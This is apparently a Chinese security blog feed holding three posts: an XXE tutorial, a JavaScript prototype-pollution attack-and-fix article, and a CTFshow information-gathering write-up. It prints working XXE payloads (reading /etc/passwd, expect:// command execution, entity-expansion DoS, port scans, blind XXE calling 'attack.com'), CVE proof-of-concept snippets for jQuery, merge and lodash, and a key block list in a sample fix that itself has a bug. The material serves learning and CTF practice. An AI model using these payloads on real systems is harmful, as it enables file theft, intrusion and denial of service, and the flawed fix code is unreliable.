<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
<p><strong>PCDATA</strong><br>
PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>
被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br>
<strong>CDATA</strong><br>
CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br>
<strong>DTD元素</strong><br>
<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br>
<strong>DTD属性</strong><br>
<strong>属性声明语法</strong>：</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>
<p>DTD实例：</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>
<p>XML实例：</p>
<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>
<p>以下是 属性类型的选项</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
<p>默认属性值可使用下列值：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
<p><strong>DTD实体</strong></p>
<blockquote>
<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>
实体引用是对实体的引用。<br>
实体可在内部或外部进行声明。</p>
</blockquote>
<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br>
<em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>
引用一般实体的方法：<code>&amp;实体名称;</code><br>
ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>
引用参数实体的方法：<code>%实体名称;</code><br>
ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br>
<em>内部实体</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>
<p>内部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>
<p><em>外部实体</em><br>
外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
或者
&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>
<p>外部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>
PHP支持的协议会更多一些，但需要一定的扩展：<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>
PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
http://url/file.txt
php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
<p><em>参数实体+外部实体</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>
<p>参数实体+外部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
  %file;
]&gt;</code></pre>
<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
<h2 id="xml外部实体注入xxe"><a class="markdownIt-Anchor" href="#xml外部实体注入xxe"></a> XML外部实体注入(XXE)</h2>
<h3 id="xxe漏洞简介"><a class="markdownIt-Anchor" href="#xxe漏洞简介"></a> XXE漏洞简介</h3>
<p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>
XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>
XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞</p>
<h3 id="xxe常见利用方式"><a class="markdownIt-Anchor" href="#xxe常见利用方式"></a> XXE常见利用方式</h3>
<p>与SQL相似，XXE漏洞也分为有回显和无回显<br>
有回显，可以直接在页面中看到payload的执行结果或现象。<br>
无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
<h4 id="读取任意文件"><a class="markdownIt-Anchor" href="#读取任意文件"></a> 读取任意文件</h4>
<p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>
示例代码</p>
<pre><code class="highlight plaintext">&lt;?php
$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
print_r($xml);//注释掉该语句即为无回显的情况
?&gt;</code></pre>
<p>构造payload</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;
或者
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>
<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
<pre><code class="highlight plaintext"></code></pre>
<h4 id="拒绝服务攻击"><a class="markdownIt-Anchor" href="#拒绝服务攻击"></a> 拒绝服务攻击</h4>
<pre><code class="highlight plaintext">&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY a0 &quot;dos&quot; &gt;
&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>
<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
<h4 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h4>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>
<h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>
<h4 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h4>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>
<h4 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h4>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
&lt;!ELEMENT data (#ANY)&gt;
]&gt;
&lt;data&gt;4&lt;/data&gt;</code></pre>
<h4 id="x-include"><a class="markdownIt-Anchor" href="#x-include"></a> X-Include</h4>
<pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>原型链污染的攻击与修复</title>
    <url>/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="原型链污染的攻击与防御"><a class="markdownIt-Anchor" href="#原型链污染的攻击与防御"></a> 原型链污染的攻击与防御</h1>
<p>先讲最为经典的Javascript原型链污染，再拓展到其他语言例如python和ruby</p>
<h2 id="javascript"><a class="markdownIt-Anchor" href="#javascript"></a> JavaScript</h2>
<h3 id="机理"><a class="markdownIt-Anchor" href="#机理"></a> 机理</h3>
<p>在js中，函数有<code>prototype</code>属性，对象有<code>__proto__</code>属性</p>
<p>对象是由函数产生 的</p>
<p>对象的<code>__proto__</code>属性指向函数的<code>prototype</code>属性</p>
<p>来看一段代码来理解一下原型这个东西，其实和我们python的SSTI的继承链很像</p>
<pre><code class="highlight js"><span class="keyword">let</span> obj = &#123;&#125;;
<span class="variable language_">console</span>.<span class="title function_">log</span>(obj);
<span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</code></pre>
<p>接着我们会看到输出</p>
<pre><code class="highlight plaintext">&#123;&#125;
[Object: null prototype] &#123;&#125;
null</code></pre>
<p>可以理出来这样的关系obj–&gt;Object–&gt;null</p>
<p>而Object自身的proto为null</p>
<p>也许你觉得不够直观，那么我会举出下面的例子:</p>
<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender</span>) &#123;
  <span class="variable language_">this</span>.<span class="property">name</span> = name;
  <span class="variable language_">this</span>.<span class="property">age</span> = age;
  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
&#125;

<span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;male&#x27;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(person);</code></pre>
<p>写一个html文件接着在里面引用这个js文件</p>
<p>在控制台就能看到</p>
<p>![屏幕截图 2025-09-10 083830](<a href="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/屏幕截图</a> 2025-09-10 083830.png)</p>
<p>在网上找了一张图来总结:</p>
<p><img src="https://image.3001.net/images/20210601/1622510962_60b58d728e2926e943511.png!small" alt="图片1.png"></p>
<p>不难看到所有对象的原型最终都会指向Object.prototype，接着指向null</p>
<p>那么到现在为止所讲的，和我们所说的污染有什么关系呢?我们再引入一个函数</p>
<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);
	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;
&#125;
<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</code></pre>
<p>再对Person稍作修改</p>
<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender,nation</span>) &#123;
  <span class="variable language_">this</span>.<span class="property">name</span> = name;
  <span class="variable language_">this</span>.<span class="property">age</span> = age;
  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
  <span class="variable language_">this</span>.<span class="property">nation</span> =<span class="string">&#x27;China&#x27;</span>;
&#125;</code></pre>
<p>此时就会有</p>
<p><img src="https://image.3001.net/images/20210601/1622510987_60b58d8bcb484a21265a7.png!small" alt="图片2.png"></p>
<p>接下来用以下代码测试</p>
<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender,nation</span>) &#123;
  <span class="variable language_">this</span>.<span class="property">name</span> = name;
  <span class="variable language_">this</span>.<span class="property">age</span> = age;
  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
  <span class="variable language_">this</span>.<span class="property">nation</span> =<span class="string">&quot;China&quot;</span>;
&#125;
<span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);
	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);
	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;
&#125;
<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();

<span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;male&#x27;</span>,<span class="string">&quot;China&quot;</span>);
<span class="keyword">var</span> teacher =<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>,<span class="number">30</span>,<span class="string">&#x27;male&#x27;</span>,<span class="string">&#x27;math&#x27;</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(teacher.<span class="property">nation</span>);
<span class="comment">//China</span></code></pre>
<p>为什么我们明明没有给Teacher定义nation的属性，却可以打印出nation呢</p>
<pre><code class="highlight plaintext">在JavaScript里，每个对象都有一个原型（prototype），这个原型本身也是一个对象，它也有自己的原型，这样就形成了一条链，叫做原型链。当你访问一个对象的属性时，如果这个对象本身没有，JavaScript引擎就会沿着原型链往上找，直到找到为止。</code></pre>
<p>所以我们就明白了原型链污染的原理了:通过污染原型的属性来达成攻击目的</p>
<p>那么假如我们正在使用一个合并的函数，那么就可以通过构造<code>&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;</code>来污染原型进而实现伪造admin</p>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li><code>__proto__</code> 是一个非标准的属性，但在大多数JavaScript引擎中都支持，它指向对象的原型。</li>
<li>有些库或框架可能会使用其他的属性来表示原型，比如 <code>constructor.prototype</code>。</li>
</ul>
</blockquote>
<h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3>
<p>以下的利用需要自己去看，去理解，去复现，碍于篇幅我就不在分析，网上的文章也很多</p>
<h4 id="不安全的递归合并merge"><a class="markdownIt-Anchor" href="#不安全的递归合并merge"></a> 不安全的递归合并(Merge)</h4>
<h5 id="jqueryextendcve-2019-11358"><a class="markdownIt-Anchor" href="#jqueryextendcve-2019-11358"></a> jQuery.extend:CVE-2019-11358</h5>
<p>3.4.0版本之前的jQuery存在一个原型污染漏洞CVE-2019-11358，PoC如下。</p>
<pre><code class="highlight plaintext">$.extend(true, &#123;&#125;, JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;z&quot;: 123&#125;&#125;&#x27;))

console.log(z); // 123</code></pre>
<h5 id="mergerecursivemerge-cve-2020-28499"><a class="markdownIt-Anchor" href="#mergerecursivemerge-cve-2020-28499"></a> merge.recursiveMerge :CVE-2020-28499</h5>
<p>此 CVE 影响 2.1.1 以下的 merge 版本</p>
<p>测试代码：</p>
<pre><code class="highlight plaintext">const merge = require(&#x27;merge&#x27;);

const payload2 = JSON.parse(&#x27;&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;&#x27;);

let obj1 = &#123;x: &#123;y:1&#125;&#125;;

console.log(&quot;Before : &quot; + obj1.polluted);
merge.recursive(obj1, payload2);
console.log(&quot;After : &quot; + obj1.polluted);
console.log(&quot;After : &quot; + &#123;&#125;.polluted);</code></pre>
<h5 id="lodashdefaultsdeep-cve-2019-10744"><a class="markdownIt-Anchor" href="#lodashdefaultsdeep-cve-2019-10744"></a> lodash.defaultsDeep : CVE-2019-10744</h5>
<p>2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p>
<p>Lodash 库中的 defaultsDeep 函数可能会被包含 constructor 的 Payload 诱骗添加或修改Object.prototype 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：</p>
<pre><code class="highlight plaintext">const mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;
const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;

function check() &#123;
    mergeFn(&#123;&#125;, JSON.parse(payload));
    if ((&#123;&#125;)[`a0`] === true) &#123;
        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);
    &#125;
  &#125;

check();

console.log(Object.whoami);</code></pre>
<p><a href="https://www.anquanke.com/post/id/248170#h2-6">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
<h4 id="按路径定义属性"><a class="markdownIt-Anchor" href="#按路径定义属性"></a> 按路径定义属性</h4>
<h3 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h3>
<p>js原型链污染的修复相对较为容易</p>
<p>只要把常用的关键字都给waf掉就可以</p>
<pre><code class="highlight plaintext">const proto = [&#x27;__proto__&#x27;, &#x27;constructor&#x27;, &#x27;prototype&#x27;]</code></pre>
<p>套用到递归函数里面把它变安全</p>
<pre><code class="highlight plaintext">function safeMerge(target, source) &#123;
    for (const key in source) &#123;
        if (key === &#x27;outputFunctionName&#x27;||key === &#x27;__proto__&#x27; || key === &#x27;constructor&#x27;||key ===&#x27;prototype&#x27;) &#123;
            continue; // 跳过敏感属性
        &#125;
        
        if (typeof target[key] === &#x27;object&#x27; &amp;&amp; typeof source[key] === &#x27;object&#x27;) &#123;
            safeMerge(target[key], source[key]);
        &#125; else &#123;
            target[key] = value;
        &#125;
    &#125;
&#125;</code></pre>
<p>或者也可以从源头上解决问题,将有可能发生污染的对象obj做以下任一操作/重写:</p>
<ul>
<li><code>let obj=Object.create(null);</code></li>
<li><code>const o=Object.freeze(obj);</code></li>
<li><code>let obj =new Map();</code></li>
<li><code>let obj =new Set();</code></li>
</ul>
<h2 id="ruby"><a class="markdownIt-Anchor" href="#ruby"></a> Ruby</h2>
<p>为什么我先讲Ruby而不是Python呢，因为Ruby也是OOP语言，并且更加贴近于js（虽说其实是先发现了Python的原型链才引出了Ruby的类污染</p>
<h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h2>
<h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2>
<p>最近太忙了，比赛一大堆，还赶上开学，复现要等后续了，现在当务之急是赶快学到能够上场的程度。。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题蛆来咯-CTFshow</title>
    <url>/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/</url>
    <content><![CDATA[<h1 id="前面忘了后面忘了记录下就对了"><a class="markdownIt-Anchor" href="#前面忘了后面忘了记录下就对了"></a> 前面忘了，后面忘了，记录下就对了</h1>
<h2 id="信息收集complete"><a class="markdownIt-Anchor" href="#信息收集complete"></a> 信息收集(Complete)</h2>
<h3 id="web01"><a class="markdownIt-Anchor" href="#web01"></a> web01</h3>
<p>入门，看源码，<code>view-source</code>/F12</p>
<h3 id="web02"><a class="markdownIt-Anchor" href="#web02"></a> web02</h3>
<p>写的无法查看就无法查看了吗?</p>
<p>非也非也</p>
<p><code>view-source</code></p>
<p>其实可以顺带观察一下源码的JS</p>
<pre><code class="highlight plaintext">&lt;script type=&quot;text/javascript&quot;&gt;
	window.oncontextmenu = function()&#123;return false&#125;;
	window.onselectstart = function()&#123;return false&#125;;
	window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;
&lt;/script&gt;</code></pre>
<p>可以看到第一个控制了右击鼠标事件，第二个控制了选择事件，第三给控制了键盘输入</p>
<p>并且返回结果都是false，这样你当然就无法进行任何操作了啦啦啦</p>
<pre><code class="highlight plaintext">禁止鼠标右键：oncontextmenu=function()&#123;return false&#125;;
禁止选择：onselectstart=function()&#123;return false&#125;;
禁止拖放：ondragstart=function()&#123;return false&#125;;
禁止拷贝：oncopy=document.selection.empty() 。
禁止复制：oncopy = function()&#123;return false&#125;;
禁止保存：&lt;noscript&gt;&lt;iframe src=&quot;*.htm&quot;&gt;&lt;/iframe&gt;&lt;/noscript&gt;，放在head里面。
禁止粘贴：&lt;input type=text onpaste=function()&#123;return false&#125;;&gt;
禁止剪贴：oncut = function()&#123;return false&#125;;；
关闭输入法：&lt;input style=&quot;ime-mode:disabled&quot;&gt;</code></pre>
<h3 id="web03"><a class="markdownIt-Anchor" href="#web03"></a> web03</h3>
<p>提示抓包，那就抓</p>
<p>bp发包直接看到flag在header里面</p>
<p>或者你F12看一眼<code>Network(网络)</code>刷新一下，点进url也可以从标头这里找到</p>
<h3 id="web04"><a class="markdownIt-Anchor" href="#web04"></a> web04</h3>
<p>提示robots</p>
<p>那就是<code>robots.txt(爬虫协议)</code>，告诉你哪些可以爬，哪些不能爬来的</p>
<p>真实场景记得别手贱就好了。。CTF倒是无所谓</p>
<pre><code class="highlight plaintext">User-agent: *
Disallow: /flagishere.txt</code></pre>
<h3 id="web05"><a class="markdownIt-Anchor" href="#web05"></a> web05</h3>
<p>提示<code>phps</code>源码泄露</p>
<p>众所周知</p>
<p><code>phps php~ php.bak</code>这些都是源码泄露，扫到就是赚到</p>
<h3 id="web06"><a class="markdownIt-Anchor" href="#web06"></a> web06</h3>
<p>解压源码到当前目录是想赤紫蛋了，感觉是<code>www.zip</code>或者<code>.git</code>之类的</p>
<p>扫一下，是www.zip</p>
<p>下下来看到目录里有<code>index.php</code>和<code>fl000g.txt</code></p>
<p>打开一眼<code>fakeflag</code>，但是路径应该没错</p>
<p>闻着味摸过去拿到flag</p>
<h3 id="web07"><a class="markdownIt-Anchor" href="#web07"></a> web07</h3>
<pre><code class="highlight plaintext">版本控制很重要，但不要部署到生产环境更重要。</code></pre>
<p>不懂，先吃我一扫</p>
<p>扫出来<code>/.git/</code>，直接给了</p>
<p>网上找了点解释</p>
<pre><code class="highlight plaintext">git 是一个版本控制工具，很多程序的开发都是多名程序员协同开发的，而 git 则是一个不错的多人协同工具+版本控制工具。

由于部署项目的方便，有很多运维人员直接在网站根目录使用 git clone 项目地址，此时网站根目录就会存在 .git 目录，通过该目录就可以回滚到某个版本或者下载最新的项目源码。
githack:https://github.com/BugScanTeam/GitHack</code></pre>
<h3 id="web08"><a class="markdownIt-Anchor" href="#web08"></a> web08</h3>
<p>hint是一样的。。</p>
<p>那再吃我一扫,扫到<code>/.svn/</code>，也是直接给</p>
<h3 id="web09"><a class="markdownIt-Anchor" href="#web09"></a> web09</h3>
<pre><code class="highlight plaintext">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</code></pre>
<p>vim？那我可要闻着味过来了</p>
<p>vim强制关闭时会产生一个<code>.swp</code>文件</p>
<pre><code class="highlight plaintext">belike: index.php -&gt; index.php.swp</code></pre>
<p>下过来就直接给了</p>
<h3 id="web10"><a class="markdownIt-Anchor" href="#web10"></a> web10</h3>
<pre><code class="highlight plaintext">cookie 只是一块饼干，不能存放任何隐私数据</code></pre>
<p>并非饼干，可以抓个包看看</p>
<p>抓到包直接Cookie: flag就写你脸上了</p>
<h3 id="web11"><a class="markdownIt-Anchor" href="#web11"></a> web11</h3>
<pre><code class="highlight plaintext">域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</code></pre>
<p>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
<p>查找flag.ctfshow.com域名下的txt记录</p>
<h3 id="web12"><a class="markdownIt-Anchor" href="#web12"></a> web12</h3>
<pre><code class="highlight plaintext">有时候网站上的公开信息，就是管理员常用密码</code></pre>
<pre><code class="highlight plaintext">Help Line Number : 372619038</code></pre>
<p>扫出来一个<code>admin/index.php</code></p>
<p>登录成功力，直接拿到flag</p>
<h3 id="web13"><a class="markdownIt-Anchor" href="#web13"></a> web13</h3>
<pre><code class="highlight plaintext">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</code></pre>
<p>根据提示感觉像弱密码</p>
<p>结果是泄露。<code>/home</code>下面探一堆找到那个<code>Document</code></p>
<p>点进去就是一个使用指南，按所给信息登录就行</p>
<h3 id="web14"><a class="markdownIt-Anchor" href="#web14"></a> web14</h3>
<pre><code class="highlight plaintext">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</code></pre>
<p>仔细观察源码，看到一个路径<code>editor/upload/banner-app.png</code></p>
<p>upload被禁止访问了，只能到<code>/editor</code>翻一下</p>
<p>翻到一个插入文件，没想到能直接调用服务器本地文件系统。</p>
<p>翻一下</p>
<p>直接拿到flag<code>路径:nothinghere/fl000g.txt</code></p>
<h3 id="web15"><a class="markdownIt-Anchor" href="#web15"></a> web15</h3>
<pre><code class="highlight plaintext">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></pre>
<p>看一眼邮箱</p>
<pre><code class="highlight plaintext">1156631961@qq.com</code></pre>
<p>又扫到<code>/admin/</code>了</p>
<p>试一下都不对啊。是不是要忘记密码</p>
<p>要回答城市。。原来是社工题目吗哈哈。。</p>
<p>QQ找一下就好了</p>
<h3 id="web16"><a class="markdownIt-Anchor" href="#web16"></a> web16</h3>
<pre><code class="highlight plaintext">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></pre>
<p>用<code>wappalyzer</code>看一眼，语言是PHP，PHP探针没跑了，探针泄露路径<code>tz.php</code></p>
<p>发现可以直接查看<code>phpinfo()</code></p>
<p>直接摸到flag</p>
<h3 id="web17"><a class="markdownIt-Anchor" href="#web17"></a> web17</h3>
<pre><code class="highlight plaintext">备份的sql文件会泄露敏感信息</code></pre>
<p>不知道指的是<code>.bak</code>的后缀还是什么</p>
<p>扫到一个<code>backup.sql</code></p>
<p>打开flag直接就在里面</p>
<h3 id="web18"><a class="markdownIt-Anchor" href="#web18"></a> web18</h3>
<pre><code class="highlight plaintext">不要着急，休息，休息一会儿，玩101分给你flag</code></pre>
<p>看来是web前端题了</p>
<p>当然先看一眼有没有源码直接给</p>
<p>摸到一个unicode编码</p>
